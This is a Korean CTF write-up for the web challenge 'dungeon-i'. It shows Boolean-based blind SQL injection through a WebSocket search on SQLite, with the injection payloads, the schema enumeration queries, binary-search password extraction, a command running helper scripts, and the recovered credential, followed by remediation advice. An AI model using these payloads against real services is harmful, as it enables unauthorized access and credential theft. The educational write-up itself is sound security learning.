---
title: "[WHS CTF] dungeon-i: WebSocket 위의 Blind SQL Injection"
date: 2026-10-30 11:30:00 +0900
categories: [CTF/Wargame]
tags: [ctf, web, sql-injection, blind-sqli, websocket, sqlite, whitehat-school]
---

화이트햇 스쿨 CTF에서 푼 웹 문제 `dungeon-i`의 풀이다. WebSocket으로 동작하는 검색 기능에서 Boolean 기반 Blind SQL Injection으로 목표 계정의 비밀번호를 한 글자씩 추출하고, 그 계정으로 로그인해 플래그를 얻는 문제였다.

> 종료된 CTF 대회의 문제를 다룬 교육용 풀이다. 실제 운영 서비스를 대상으로 한 테스트는 허가받은 범위에서만 해야 한다.
{: .prompt-info }

## 문제 개요

| 항목 | 내용 |
| --- | --- |
| 분야 | Web |
| 취약점 | WebSocket 검색 기능의 Boolean-based Blind SQL Injection |
| DBMS | SQLite |
| 목표 | `wayfinder` 계정의 자격증명 획득 → 플래그 |

다크웹 커뮤니티를 흉내 낸 서비스로, "던전"의 위치에 관한 글이 오가는 게시판이 있었다. 누군가 던전의 정확한 좌표를 찾아 자기 페이지에 적어 두었다는 설정이다.

## 1. 목표 계정 찾기

게시판 목록 API를 확인하니, 9번 글의 작성자가 목표 계정 `wayfinder`였다.

```json
GET /api/guestbook

{
  "id": 9,
  "code": "YH-2026-0009",
  "title": "정확한 위치를 찾았다",
  "visitor": "wayfinder"
}
```

글 내용에는 좌표를 "자신의 페이지에 적어 두었다"는 단서가 있었다.

```text
다들 소문만 무성한 그곳, 내가 정확한 위치를 찾아냈다.
나중에 또 갈 거니까 내 페이지에 적어둔다.
```

즉, `wayfinder` 계정에 접근하는 것이 1차 목표가 됐다.

## 2. 공격 표면 발견

일반 계정을 만들어 로그인한 뒤, `/account` 페이지의 JavaScript를 살펴봤다. 게시글 번호를 추적하는 WebSocket 검색 기능이 있었다.

```javascript
ws = new WebSocket("wss://" + location.host + "/ws");
ws.send(JSON.stringify({
  action: "search",
  query: input.value
}));
```

응답의 `match` 값이 **검색 결과의 존재 여부**(true/false)를 나타냈다.

```json
{"status":"ok","match":false,"trace":{"found":false}}
```

여기서 핵심은, 응답이 데이터 자체가 아니라 "조건이 참인가 거짓인가"만 돌려준다는 점이다. 이 참/거짓 응답 하나가 Blind SQL Injection의 **oracle**(질문에 예/아니오로 답해 주는 판별기)이 된다.

## 3. Boolean-based Blind SQL Injection 확인

입력 앞부분에는 `YH-2026-####` 형태의 게시글 번호 형식 검증이 있었다. 이 형식을 통과시킨 뒤, 작은따옴표로 SQL 문자열을 닫고 조건식을 덧붙였다.

판별 방법은 단순하다. **항상 거짓인 조건**과 **항상 참인 조건**을 각각 넣어 응답이 갈리는지 본다.

거짓 조건:

```text
YH-2026-9999' OR 1=0--
```
```json
{"status":"ok","match":false,"trace":{"found":false}}
```

참 조건:

```text
YH-2026-9999' OR 1=1--
```
```json
{"status":"ok","match":true,"trace":{"found":false}}
```

응답이 갈렸다. 주입한 SQL이 실제로 평가되고 있다는 뜻이다. 이어서 `sqlite_version()`과 `sqlite_master`를 참조하는 조건도 정상 평가됐다.

```text
YH-2026-9999' OR substr(sqlite_version(),1,1)='3'--
YH-2026-9999' OR (SELECT count(*) FROM sqlite_master WHERE type='table')>0--
```

두 쿼리 모두 `match:true`를 반환해, SQLite 기반이라는 것과 Boolean oracle을 모두 확보했다. 취약한 쿼리는 개념적으로 사용자 입력을 문자열로 그대로 이어 붙인 형태였다.

```sql
SELECT ...
FROM ...
WHERE code = '<사용자 입력>';
```

## 4. 스키마와 복구 데이터 확인

oracle을 확보했으니, 참/거짓 질문을 반복해 정보를 추출할 수 있다. `sqlite_master`를 블라인드로 읽어 테이블 구조를 확인했다.

```text
guestbook, sketches, comments, recovery, users, ...
```

`recovery`라는 테이블이 눈에 띄었다. `pragma_table_info()`로 이 테이블에 `username`과 `password` 컬럼이 있는지 확인했다.

```sql
EXISTS(SELECT 1 FROM pragma_table_info('recovery') WHERE name='username')
EXISTS(SELECT 1 FROM pragma_table_info('recovery') WHERE name='password')
```

두 조건 모두 참이었다. 공개 게시글의 다음 내용도 복구 테이블에 평문 자격증명이 저장됐다는 힌트였다.

```text
비밀번호 까먹었으면 관리자한테 말하면 비밀번호 알려준다.
비밀번호를 모르면 어떻게 알려 주겠어?
```

## 5. 비밀번호 추출

Blind SQLi에서 값을 알아내는 방법은 "한 글자씩, 참/거짓 질문으로" 좁혀 가는 것이다. 각 문자의 ASCII 값을 **이분 탐색**으로 찾는다.

```sql
unicode(
  substr(
    (SELECT password FROM recovery WHERE username='wayfinder'),
    <position>,
    1
  )
) >= <mid>
```

실제 WebSocket payload는 이런 형태다.

```text
YH-2026-9999' OR (
  unicode(substr(
    (SELECT password FROM recovery WHERE username='wayfinder'),
    1, 1
  )) >= 64
)--
```

여기서 탐색 공간을 줄이는 관찰이 중요했다. 비밀번호가 **48자의 소문자 16진 문자열**이라는 것을 먼저 확인하면, 각 글자가 `0123456789abcdef` 16가지뿐이므로 **문자당 4번**의 질문(2⁴ = 16)이면 확정된다. "ASCII 전체(약 7비트)를 탐색"에서 "16진 한 자리(4비트)"로 줄어드는 것이다.

보조 스크립트는 역할별로 나눴다.

| 스크립트 | 역할 |
| --- | --- |
| `ws_probe.js` | WebSocket 요청을 보내고 true/false 응답 확인 |
| `blind_extract.js` | 단일 연결로 문자열을 한 글자씩 추출 |
| `blind_parallel.js` | 여러 저강도 연결로 문자들을 병렬 추출 |

```bash
node blind_parallel.js \
  "SELECT password FROM recovery WHERE username='wayfinder'" \
  48 6 /tmp/whsctf_cookies.txt '' 0123456789abcdef
```

병렬 추출은 서로 다른 문자 위치를 동시에 질의해 전체 시간을 줄이려는 것이었다. 다만 연결 수를 과하게 늘리면 서버에 부담을 주므로 저강도로 제한했다. 추출한 비밀번호는 다음과 같았다.

```text
2dcc765aff0eb8ed5fa253539ec848920cbde64266686d07
```

## 6. 로그인과 플래그

추출한 자격증명으로 로그인이 성공했다.

```json
POST /api/login

{"username":"wayfinder","password":"2dcc...6d07"}
→ {"ok":true}
```

`wayfinder`로 로그인한 상태에서 `/account`를 다시 열면 일반 계정과 다른 전용 페이지가 렌더링됐고, 하단 JavaScript에서 전용 API `/api/keystone`을 찾을 수 있었다. 같은 세션으로 요청하자 좌표와 플래그가 돌아왔다.

```json
GET /api/keystone   (wayfinder 세션)

{
  "ok": true,
  "hidden_passage": "/th3_w4y_1s_h3r3/",
  "key": "WHS{th3_...c00rds}"
}
```

이 API는 비인증 상태와 일반 계정 세션에서는 모두 404를 반환하고, `wayfinder` 세션에서만 데이터를 반환했다.

## 취약점 수정 방안

write-up을 정리하며 가장 중요하게 본 부분이다. 이 문제의 구멍은 한 곳이 아니라 여러 겹이었다.

1. **문자열 결합 대신 파라미터 바인딩**: WebSocket 검색 SQL을 문자열로 이어 붙이지 말고 prepared statement로 실행한다. 이것이 근본 원인에 대한 1차 방어다.
2. **검증된 값만 전달**: 게시글 번호를 정규식으로 검증했다면, 원본 입력이 아니라 검증을 통과한 코드 값만 DB에 넘긴다. 이 문제는 형식 검증은 했지만 그 뒤에 붙는 조건식을 막지 못했다.
3. **평문 비밀번호 금지**: 비밀번호를 복구 가능한 평문으로 저장하지 말고 Argon2id나 bcrypt 같은 전용 해시를 쓴다. `recovery` 테이블의 평문 저장이 추출의 가치를 만들었다.
4. **권한은 숨김이 아니라 검사로**: 전용 API를 404로 숨기는 것에 의존하지 말고, 서버에서 사용자 권한을 명시적으로 검사한다.

## 배운 점

- **데이터를 직접 반환하지 않아도 정보는 샌다.** 응답은 `match: true/false` 하나뿐이었지만, 질문을 반복하는 것만으로 48자 비밀번호를 전부 복원했다. "참/거짓만 알려 주니 안전하다"는 가정은 성립하지 않는다.
- **탐색 공간을 좁히는 사전 정보가 비용을 결정한다.** 문자집합을 16진으로 제한한 순간 추출 비용이 크게 내려갔다. 공격이든 방어든, 전제 하나가 난이도를 바꾼다.
- **방어는 여러 겹이어야 한다.** 파라미터 바인딩 하나만 제대로 됐어도 막혔을 문제지만, 평문 저장과 숨김 기반 권한까지 겹쳐 피해가 커졌다. 최근 팀 프로젝트에서 공급망 보안을 3계층으로 나눴던 것과 같은 결론이다. 한 계층의 빈틈을 다른 계층이 메워야 한다. ([관련 글](/posts/whitehat-4th-project-retro/))
